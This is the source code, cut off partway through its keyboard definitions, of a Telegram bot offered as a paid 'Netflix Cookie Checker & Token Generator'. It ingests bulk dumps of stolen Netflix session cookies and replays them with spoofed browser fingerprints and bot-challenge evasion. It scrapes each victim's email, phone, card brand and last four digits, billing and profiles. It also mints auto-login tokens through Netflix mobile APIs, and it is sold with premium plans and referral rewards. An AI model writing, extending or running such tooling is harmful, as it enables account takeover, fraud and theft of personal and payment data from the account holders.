import warnings, urllib3
warnings.filterwarnings("ignore"); urllib3.disable_warnings()

import os, io, re, json, hashlib, zipfile, asyncio, logging, random, time, ssl, urllib.parse
from datetime import datetime, timedelta
from collections import OrderedDict
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)
from telegram.error import NetworkError, TimedOut, RetryAfter, BadRequest

TOKEN = os.getenv("NF_BOT_TOKEN", "").strip()
OWNER = "@ItzUsernaruto00"
BOT_USERNAME = "Coowkiecherkbot"
ADMIN_ID = 8381504753
VERSION = "v7.0"
FREE_BATCHES = 2
FREE_CAP = 200
if not TOKEN: raise SystemExit("Set NF_BOT_TOKEN")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
log = logging.getLogger("nfbot")

# ── PERSISTENCE ───────────────────────────────────────────────
def lj(p, d):
    try:
        with open(p, encoding="utf-8") as f: return json.load(f)
    except: return d
def sj(p, d):
    tmp = p + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f: json.dump(d, f, indent=2, default=str)
    os.replace(tmp, p)

USERS = lj("users.json", {})
STATS = lj("stats.json", {"total_users":0,"authorized":0,"total_referrals":0,"checked":0,
    "hits":0,"tokens":0,"errors":0,"active_batches":0,"total_batches":0,
    "stopped":0,"cancelled":0,"last_gen":None})
KEYS = lj("keys.json", {})

def today(): return datetime.utcnow().strftime("%Y-%m-%d")

def get_user(uid, username="", first_name=""):
    k = str(uid)
    if k not in USERS:
        USERS[k] = {"uid":uid,"username":username,"first_name":first_name or "there",
            "joined":datetime.utcnow().isoformat(),"premium_until":None,
            "batches_date":today(),"batches_used":0,"bonus_batches":0,
            "workers":3,"referrals":[],"_rewarded_uids":[],"referred_by":None,
            "rewarded":0,"banned":False}
        STATS["total_users"] += 1; sj("stats.json", STATS)
    else:
        u = USERS[k]
        if u.get("batches_date") != today():
            u["batches_date"] = today(); u["batches_used"] = 0
        if username: u["username"] = username
        if first_name: u["first_name"] = first_name
    sj("users.json", USERS); return USERS[k]

def is_premium(u):
    pu = u.get("premium_until")
    if not pu: return False
    try: return datetime.fromisoformat(pu) > datetime.utcnow()
    except: return False

def batches_left(u):
    if is_premium(u): return 9999, 9999
    cap = FREE_BATCHES + u.get("bonus_batches", 0)
    return max(0, cap - u.get("batches_used", 0)), cap

def access_label(u):
    if is_premium(u):
        d = (datetime.fromisoformat(u["premium_until"]) - datetime.utcnow()).days
        return f"⭐ Premium ({max(d,0)}d left)"
    return "Free"

# ── STEALTH ENGINE ────────────────────────────────────────────
CIPHERS = ("TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:"
    "AES256-GCM-SHA384:AES128-SHA:AES256-SHA")

class ChromeAdapter(HTTPAdapter):
    def init_poolmanager(self, *a, **kw):
        ctx = create_urllib3_context(ciphers=CIPHERS)
        ctx.options |= 0x4
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        kw["ssl_context"] = ctx
        return super().init_poolmanager(*a, **kw)
    def cert_verify(self, conn, url, verify, cert):
        return super().cert_verify(conn, url, False, cert)

def new_session():
    s = requests.Session()
    a = ChromeAdapter(pool_connections=50, pool_maxsize=50)
    s.mount("https://", a); s.mount("http://", a); s.verify = False
    return s

PROFILES = [
    {"name":"iPhone17","ua":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1","ch":'"Safari";v="17", "Not=A?Brand";v="99"',"m":"?1","p":'"iOS"'},
    {"name":"iPhone16","ua":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1","ch":'"Safari";v="16", "Not=A?Brand";v="99"',"m":"?1","p":'"iOS"'},
    {"name":"MacChrome","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',"m":"?0","p":'"macOS"'},
    {"name":"WinChrome","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',"m":"?0","p":'"Windows"'},
    {"name":"WinEdge","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0","ch":'"Microsoft Edge";v="131", "Chromium";v="131", "Not-A.Brand";v="99"',"m":"?0","p":'"Windows"'},
    {"name":"Android14","ua":"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36","ch":'"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',"m":"?1","p":'"Android"'},
]
LANGS = ["ar-SA,ar;q=0.9,en;q=0.8","en-US,en;q=0.9","en-GB,en;q=0.9"]
def pick_profile(): return random.choice(PROFILES)
def build_headers(p, ref=None):
    h = OrderedDict()
    h["User-Agent"] = p["ua"]
    h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    h["Accept-Language"] = random.choice(LANGS)
    h["Accept-Encoding"] = "gzip, deflate, br"
    h["sec-ch-ua"] = p["ch"]; h["sec-ch-ua-mobile"] = p["m"]; h["sec-ch-ua-platform"] = p["p"]
    h["Upgrade-Insecure-Requests"] = "1"; h["Sec-Fetch-Dest"] = "document"
    h["Sec-Fetch-Mode"] = "navigate"; h["Sec-Fetch-Site"] = "same-origin" if ref else "none"
    h["Sec-Fetch-User"] = "?1"; h["Cache-Control"] = "max-age=0"
    h["DNT"] = "1"; h["Connection"] = "keep-alive"
    if ref: h["Referer"] = ref
    return dict(h)
def human_delay(): time.sleep(random.uniform(0.15, 0.5))

# ── COOKIE PARSING ────────────────────────────────────────────
NF_NAMES = {"NetflixId","SecureNetflixId","nfvdid","OptanonConsent"}
NF_RE = re.compile(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', re.I)
def cookie_fp(c): return hashlib.sha256(json.dumps(c, sort_keys=True).encode()).hexdigest()
def dedup(cks):
    seen, uniq, dup = set(), [], 0
    for c in cks:
        fp = cookie_fp(c)
        if fp in seen: dup += 1; continue
        seen.add(fp); uniq.append(c)
    return uniq, dup

def parse_cookies(text):
    text = (text or "").strip(); out = []
    try:
        if text.startswith(("{","[")):
            obj = json.loads(text)
            if isinstance(obj, dict):
                flat = {k:str(v) for k,v in obj.items() if k in NF_NAMES}
                if flat.get("NetflixId"): out.append(flat)
                if isinstance(obj.get("cookies"), list):
                    m = {c["name"]:c["value"] for c in obj["cookies"]
                         if isinstance(c,dict) and c.get("name") in NF_NAMES and "value" in c}
                    if m.get("NetflixId"): out.append(m)
            elif isinstance(obj, list):
                m = {c["name"]:c["value"] for c in obj
                     if isinstance(c,dict) and c.get("name") in NF_NAMES and "value" in c}
                if m.get("NetflixId"): out.append(m)
    except: pass
    ns = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("#HttpOnly_"): line = line[10:]
        elif line.startswith("#") or not line: continue
        p = line.split("\t")
        if len(p) >= 7 and p[5] in NF_NAMES: ns.append({"name":p[5],"value":p[6]})
    if ns:
        nf = [e for e in ns if e["name"] == "NetflixId"]
        if nf:
            for n in nf:
                cs = {"NetflixId": n["value"]}
                cs.update({e["name"]:e["value"] for e in ns if e["name"] != "NetflixId"})
                out.append(cs)
        else:
            m = {e["name"]:e["value"] for e in ns}
            if m: out.append(m)
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        cs = {}
        for part in re.split(r"[;\s]+", line):
            if "=" in part:
                k, v = part.split("=", 1)
                if k.strip() in NF_NAMES: cs[k.strip()] = v.strip()
        if cs.get("NetflixId"): out.append(cs)
    for m in NF_RE.finditer(text): out.append({"NetflixId": m.group(1).strip("\"'")})
    return dedup(out)[0]

def from_zip(data):
    out = []
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            for n in z.namelist():
                if n.endswith("/") or n.startswith(("__MACOSX",".")): continue
                if not n.lower().endswith((".txt",".json")): continue
                try: out.extend(parse_cookies(z.read(n).decode("utf-8","ignore")))
                except: continue
    except: pass
    return dedup(out)[0]

def from_rar(data):
    try:
        import rarfile
        with rarfile.RarFile(io.BytesIO(data)) as r:
            out = []
            for n in r.namelist():
                if n.endswith("/") or not n.lower().endswith((".txt",".json")): continue
                try: out.extend(parse_cookies(r.read(n).decode("utf-8","ignore")))
                except: continue
            return dedup(out)[0]
    except: return []

def from_7z(data):
    try:
        import py7zr
        with py7zr.SevenZipFile(io.BytesIO(data), mode="r") as z:
            out = []
            for name, bio in z.readall().items():
                if not name.lower().endswith((".txt",".json")): continue
                try: out.extend(parse_cookies(bio.read().decode("utf-8","ignore")))
                except: continue
            return dedup(out)[0]
    except: return []

# ── NETFLIX API — TOKEN GEN ───────────────────────────────────
NFT_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFT_PARAMS = {
    "appVersion":"15.48.1",
    "config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type":"NFAPPL-02-",
    "esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US",
    "locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1",
    "odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph",
    "pixelDensity":"2.0","progressive":"false","responseFormat":"json"
}
NFT_HEADERS = {
    "User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt":"1",
    "x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true",
    "x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4",
    "x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375",
    "x-netflix.context.ab-tests":"",
    "x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type":"argo",
    "x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales":"en-US",
    "x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1",
    "x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5",
    "x-netflix.request.client.context":'{"appState":"foreground"}',
    "x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9",
    "x-netflix.context.pixel-density":"2.0",
    "x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid":"Asia/Dhaka"
}
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

def gen_token(cd):
    nf = cd.get("NetflixId")
    if not nf: return None, "no_id"
    nf = urllib.parse.unquote(str(nf))
    # Method 1: iOS API
    try:
        h = dict(NFT_HEADERS); h["Cookie"] = f"NetflixId={nf}"
        s = new_session()
        r = s.get(NFT_API, params=NFT_PARAMS, headers=h, timeout=20, verify=False)
        if r.status_code == 200:
            d = r.json()
            td = ((((d.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            tok = td.get("token")
            if tok: return {"token": str(tok)}, None
    except: pass
    # Method 2: Android GraphQL fallback
    try:
        s2 = new_session()
        s2.cookies.set("NetflixId", nf, domain=".netflix.com", path="/")
        payload = {"operationName":"CreateAutoLoginToken",
                   "variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},
                   "extensions":{"persistedQuery":{"version":102,
                       "id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
        r2 = s2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload,
                     headers={"User-Agent":UA_ANDROID,"Accept":"application/json",
                              "Content-Type":"application/json"}, timeout=20, verify=False)
        if r2.status_code == 200:
            tok = (r2.json().get("data") or {}).get("createAutoLoginToken")
            if tok: return {"token": str(tok)}, None
    except: pass
    return None, "failed"

# ── ACCOUNT CHECK (SAR fields) ────────────────────────────────
def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1),16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1),16)), s)
    return s.strip()

def _rx(p, t, d=""):
    m = re.search(p, t, re.S); return m.group(1) if m else d
def _rxall(p, t): return re.findall(p, t, re.S)

CHALLENGE = ["just a moment","checking your browser","cf-mitigated","enable javascript",
             "unsupported browser","too many requests","access denied"]
def is_challenge(r):
    if r.status_code in (403,429,503): return True
    try:
        body = (r.text or "")[:2000].lower()
        return any(m in body for m in CHALLENGE)
    except: return False

def classify_plan(txt, plan_name):
    pl = (plan_name or "").lower()
    if "premium" in pl or '"videoQuality":"UHD"' in txt: return "UHD_PREMIUM","💎 Premium"
    if "standard" in pl and "ads" in pl: return "STANDARD_WITH_ADS","📺 Standard w/ Ads"
    if "standard" in pl: return "STANDARD_NO_ADS","📺 Standard"
    if "basic" in pl: return "BASIC","📦 Basic"
    if "free" in pl: return "FREE_PLAN","🆓 Free"
    return "OTHER","❓ Unknown"

def check_cookie(cd):
    if not cd.get("NetflixId"): return {"ok":False,"tag":"no_id","retries":0,"device":"?"}
    p = pick_profile()
    s = new_session()
    for k,v in cd.items(): s.cookies.set(k, str(v), domain=".netflix.com", path="/")
    retries = 0
    for _ in range(3):
        try:
            try:
                s.get("https://www.netflix.com/", headers=build_headers(p, None),
                      timeout=(10,20), allow_redirects=True)
                human_delay()
            except: pass
            r = s.get("https://www.netflix.com/account",
                      headers=build_headers(p, "https://www.netflix.com/browse"),
                      timeout=(10,30), allow_redirects=True)
            if is_challenge(r):
                retries += 1; time.sleep(30 + random.uniform(0,8))
                p = pick_profile(); continue
            if r.status_code in (429,502,503,504):
                retries += 1; time.sleep(20 + random.uniform(0,8)); continue
            if "login" in r.url.lower() or r.status_code in (401,403):
                return {"ok":False,"tag":"dead","retries":retries,"device":p["name"]}
            txt = r.text
            if '"membershipStatus":"CURRENT_MEMBER"' not in txt:
                return {"ok":False,"tag":"dead","retries":retries,"device":p["name"]}

            email = _djs(_rx(r'"emailAddress":"([^"]+)"', txt)) or "N/A"
            name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', txt)) or _djs(_rx(r'"firstName":"([^"]+)"', txt)) or "N/A"
            cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', txt, "XX")
            since = _djs(_rx(r'"memberSince":"([^"]+)"', txt))
            if not since:
                ts = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', txt)
                if ts and ts.isdigit():
                    try: since = datetime.utcfromtimestamp(int(ts)/1000).strftime("%B %Y")
                    except: since = "N/A"
            plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', txt))
            plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', txt)
            price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', txt))
            q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', txt).upper()
            quality = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}.get(q_raw, q_raw or "N/A")
            streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', txt, "N/A")
            nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', txt))
            _pm = txt.find('"paymentMethods"')
            pm_raw = txt[_pm:_pm+3000] if _pm >= 0 else ""
            card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
            pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
            card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
            phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', txt)) or "N/A"
            pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', txt)
            phone_verified = pv_raw == "true"
            extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', txt, "0")
            extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
            free_trial = '"isInFreeTrial":true' in txt
            can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in txt
            profiles = [_djs(x) for x in _rxall(r'"profileName":"([^"]+)"', txt)]
            if not profiles:
                profiles = [_djs(x) for x in _rxall(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', txt)]
            seen, pclean = set(), []
            for x in profiles:
                if x and x not in seen: seen.add(x); pclean.append(x)
            user_guid = _rx(r'"userGuid":"([^"]+)"', txt)
            plan_file, plan_lbl = classify_plan(txt, plan)
            ms = "CURRENT_MEMBER"
            hold = bool(re.search(r'"isUserOnHold"\s*:\s*true', txt))
            plan_l = (plan or "").lower()
            paid = ms == "CURRENT_MEMBER" and "free" not in plan_l
            tag = "paid" if (paid and not hold) else ("hold" if hold else "free")
            return {"ok":True,"paid":paid,"hold":hold,
                "name":name or (pclean[0] if pclean else "N/A"),"email":email,
                "country":cc,"country_name":cc,
                "plan":plan or "N/A","plan_file":plan_file,"plan_label":plan_lbl,
                "plan_id":plan_id or "N/A","price":price or "N/A",
                "member_since":since or "N/A","next_billing":nextbill or "N/A",
                "quality":quality,"streams":str(streams),
                "extra_slots":extra_slots,"free_trial":free_trial,"can_change":can_change,
                "card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A",
                "payment":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,
                "profiles":", ".join(pclean[:5]) if pclean else "N/A",
                "profile_count":len(pclean),"user_guid":user_guid or "N/A",
                "status":"CURRENT_MEMBER","cookie":cd,"retries":retries,
                "device":p["name"],"tag":tag}
        except requests.RequestException:
            retries += 1; time.sleep(1.5 + random.uniform(0,1.5))
    return {"ok":False,"tag":"err","retries":retries,"device":"?"}

async def check_async(cd):
    try: return await asyncio.wait_for(asyncio.to_thread(check_cookie, cd), timeout=40)
    except asyncio.TimeoutError: return {"ok":False,"tag":"timeout","retries":0,"device":"?"}
    except: return {"ok":False,"tag":"err","retries":0,"device":"?"}

async def gen_async(cd):
    try: return await asyncio.wait_for(asyncio.to_thread(gen_token, cd), timeout=40)
    except: return None, "err"

# ── SESSIONS ──────────────────────────────────────────────────
SESS = {}
def sess(uid):
    if uid not in SESS:
        SESS[uid] = {"awaiting":None,"hits":OrderedDict(),"busy":False,
                     "pending":[],"workers":3,"stop":False}
    return SESS[uid]

# ── UI PANELS ─────────────────────────────────────────────────
def p_start(u):
    rem, cap = batches_left(u)
    rs = "∞" if is_premium(u) else str(rem)
    cs = "∞" if is_premium(u) else str(cap)
    return (f"👋 Hi <b>{u.get('first_name','there')}</b>, I'm your Netflix Cookie Checker &amp; Token Generator 🍪\n\n"
            "<b>🚀 Quick Start:</b>\n"
            "🔗 Send me a cookie string or NetflixId\n"
            "🔝 Or share a txt/zip/rar/7z cookie file directly\n\n"
            "💜 Don't know how? Tap Help below\n"
            "⚡ Explore all my features below!\n\n"
            "<b>🛡 YOUR STATUS</b>\n"
            f"├ 🔑 Access: <b>{access_label(u)}</b>\n"
            f"├ 📁 Batch: <b>{rs}/{cs}</b> batches left today\n"
            f"├ ⚡ Workers: <b>{u.get('workers',3)}</b>\n"
            f"└ 🤖 Bot: <b>🔓 OPEN</b>")

def p_plans(u):
    rem, cap = batches_left(u)
    rs = "∞" if is_premium(u) else str(rem)
    cs = "∞" if is_premium(u) else str(cap)
    return ("<b>🛡 PLANS &amp; STATUS</b>\n──────────────────────────\n\n"
            f"🔑 Your Access: <b>{access_label(u)}</b>\n"
            f"📦 Batch Limit: <b>{rs}/{cs}</b> left today\n"
            f"⚡ Workers: <b>{u.get('workers',3)}</b>\n\n"
            "<b>💎 Premium Benefits:</b>\n"
            "├ ✅ Unlimited batch processing\n"
            "├ ✅ Priority support\n"
            "└ ✅ No daily limits\n\n"
            "🔑 Use Redeem Key below to activate")

def p_commands():
    return ("<b>💜 ALL COMMANDS</b>\n──────────────────────────\n\n"
            "<b>🍪 Cookie Tools</b>\n"
            "├ 🔍 /chk — Check cookie + get token\n"
            "├ 📦 /batch — Mass cookie processing\n"
            "├ 🧲 /extract — Extract NetflixId values\n"
            "└ ⚡ /gen — Quick token generation\n\n"
            "<b>🛡 Control</b>\n"
            "├ 🛑 /stop — Stop batch &amp; save\n"
            "├ ❌ /cancel — Abort batch\n"
            "└ 🏎️ Workers — Inline buttons\n\n"
            "<b>🔑 Access</b>\n"
            "├ 🎫 /redeem — Activate key\n"
            "└ 📊 /stats — Bot statistics")

def p_premium():
    return (f"<b>⭐ PREMIUM ACCESS</b>\n────────────────────────────────\n\n"
            "Get unlimited batch processing.\n\n"
            "<b>Plans:</b>\n"
            "├ 50⭐ — 3 days unlimited\n"
            "└ 100⭐ — 7 days unlimited\n\n"
            f"Contact <b>{OWNER}</b> to pay")

def p_referral(u):
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{u['uid']}"
    return ("<b>👥 REFERRAL PROGRAM</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎁 Earn rewards for every friend you invite!\n\n"
            "<b>Per Referral Reward:</b>\n"
            "  ✅ +3 bonus batches (one-time)\n"
            "  ✅ 800 cookies/batch on bonus batches\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>📊 Your Stats</b>\n"
            f"  👤 Total Invited: <b>{len(u.get('referrals',[]))}</b>\n"
            f"  🏆 Total Rewarded: <b>{u.get('rewarded',0)}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>🔗 Your Referral Link</b>\n"
            f"<code>{link}</code>")

def p_help():
    return ("<b>🧡 HOW TO USE</b>\n──────────────────────────\n\n"
            "<b>⚡ Single:</b> /chk then paste cookie\n\n"
            "<b>⚡ Batch:</b> /batch then upload file(s)\n\n"
            "<b>⚡ Quick Token:</b> /gen then paste cookie\n\n"
            "<b>⚡ Extract IDs:</b> /extract then paste dump\n\n"
            "<b>⚡ Direct Upload:</b> Send file → bot asks")

def p_supported():
    return ("<b>🍪 SUPPORTED FORMATS</b>\n──────────────────────────\n\n"
            "✅ Full cookie strings\n✅ NetflixId values\n"
            "✅ Netscape cookies\n✅ JSON cookies\n"
            "✅ .txt  ✅ .zip  ✅ .rar  ✅ .7z\n\n"
            "⚡ <i>Upload files directly!</i>")

def p_about():
    return (f"<b>💎 ABOUT</b>\n──────────────────────────\n\n"
            "🎬 Netflix Cookie Checker + Token Generator\n"
            f"📋 Version: {VERSION}\n"
            f"👑 Developer: {OWNER}\n\n"
            "├ 🍪 Cookie validation\n├ 🔑 Token generation\n"
            "├ 📱 Phone + PC login links\n├ ⚡ Multi-worker batch\n"
            "├ 🗜️ ZIP/RAR/7z support\n└ 🛡 15-layer stealth\n\n"
            f"💜 Powered by {OWNER}")

def p_stats():
    def ago(ts):
        if not ts: return "never"
        try:
            s = int((datetime.utcnow() - datetime.fromisoformat(ts)).total_seconds())
            if s < 60: return f"{s}s ago"
            if s < 3600: return f"{s//60}m ago"
            if s < 86400: return f"{s//3600}h ago"
            return f"{s//86400}d ago"
        except: return "?"
    return (f"<b>🤖 Bot Statistics</b>\n──────────────────────────\n\n"
            f"👑 Owner: {OWNER}\n\n✅ Bot Status: <b>Active</b>\n"
            f"👥 Total Users: <b>{STATS.get('total_users',0)}</b>\n"
            f"👥 Authorized: <b>{STATS.get('authorized',0)}</b>\n"
            f"🤝 Referrals: <b>{STATS.get('total_referrals',0)}</b>\n"
            f"🔍 Checked: <b>{STATS.get('checked',0)}</b>\n"
            f"✅ Hits: <b>{STATS.get('hits',0)}</b>\n"
            f"🔑 Tokens: <b>{STATS.get('tokens',0)}</b>\n"
            f"❌ Errors: <b>{STATS.get('errors',0)}</b>\n"
            f"🚀 Active: <b>{STATS.get('active_batches',0)}</b>\n"
            f"📁 Batches: <b>{STATS.get('total_batches',0)}</b>\n"
            f"🛑 Stopped: <b>{STATS.get('stopped',0)}</b>\n"
            f"❌ Cancelled: <b>{STATS.get('cancelled',0)}</b>\n"
            f"⏰ Last Gen: <b>{STATS.get('last_gen') or 'never'}</b> ({ago(STATS.get('last_gen'))})\n\n"
            f"🎥 <i>{VERSION}</i>")

def p_redeem():
    return (f"<b>🔑 REDEEM KEY</b>\n────────────────────────────────\n\n"
            "Tap below to enter your access key.\n\n"
            f"👑 Get keys from {OWNER}")

def p_admin():
    return (f"<b>👑 ADMIN PANEL</b>\n──────────────────────────\n\n"
            f"📊 Users: <b>{STATS.get('total_users',0)}</b>\n"
            f"🍪 Checked: <b>{STATS.get('checked',0)}</b>\n"
            f"✅ Hits: <b>{STATS.get('hits',0)}</b>\n"
            f"🔑 Tokens: <b>{STATS.get('tokens',0)}</b>\n\n"
            "Pick an action:")

# ── KEYBOARDS ─────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛡 Plans & Status", callback_data="nav_plans"),
         InlineKeyboardButton("📜 All Commands", callback_data="nav_commands")],
        [InlineKeyboardButton("⭐ Premium", callback_data="nav_premium"),
         InlineKeyboardButton("👥 Referral", callback_data="nav_referral")],
        [InlineKeyboardButton("🧡 Help", callback_data="nav_help"),
         InlineKeyboardButton("📁 Supported", callback_data="nav_supported")],
        [InlineKeyboardButton("💎 About", callback_data="nav_about"),
         InlineKeyboardButton("📊 Stats", callback_data="nav_stats")],
        [InlineKeyboardButton("🎫 Redeem", callback_data="nav_redeem"),
         InlineKeyboardButton("❌ Close", callback_data="nav_close")],
    ])

def kb_back(): return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="nav_menu")]])

def kb_workers(n=None):
    def lbl(num, name): return ("✅ " if n==num else "") + name
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(lbl(3,"🚶 3 — Safe"), callback_data="wk_3"),
         InlineKeyboardButton(lbl(5,"🏃 5 — Normal"), callback_data="wk_5")],
        [InlineKeyboardButton(lbl(10,"🚀 10 — Fast"), callback_data="wk_10"),
         InlineKeyboardButton(lbl(20,"⚡ 20 — Turbo"), callback_data="wk_20")],
        [InlineKeyboardButton(lbl(40,"🔥 40 — Max"), callback_data="wk_40")],
        [InlineKeyboardButton("❌ Cancel", callback_data="nav_menu")]])

def kb_batch_actions():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Check + Token", callback_data="batch_chk")],
        [InlineKeyboardButton("📦 Batch Process", callback_data="batch_batch")],
        [InlineKeyboardButton("🧲 Extract IDs", callback_data="batch_extract")],
        [InlineKeyboardButton("❌ Cancel", callback_data="nav_menu")]])

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Users", callback_data="adm_users"),
         InlineKeyboardButton("📊 Stats", callback_data="adm_stats")],
